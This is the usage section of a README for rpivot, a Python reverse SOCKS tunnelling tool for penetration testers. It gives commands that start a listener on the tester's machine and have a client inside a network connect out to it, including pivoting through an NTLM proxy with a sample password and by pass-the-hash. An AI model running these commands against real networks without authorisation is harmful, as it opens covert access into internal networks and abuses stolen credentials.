# Usage example


This tool is Python 2.6-2.7 compatible and has no dependencies beyond the standard library. It has client-server architecture. Just run the client on the machine you want to tunnel the traffic through. Server should be started on pentester's machine and listen to incoming connections from the client.

Start server listener on port 9999, which creates a socks 4 proxy on 127.0.0.1:1080 upon connection from client:

```python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080```

Connect to the server:

```python client.py --server-ip <rpivot_server_ip> --server-port 9999```

To pivot through an NTLM proxy:

```python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd```

Pass-the-hash is supported:

```python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45```
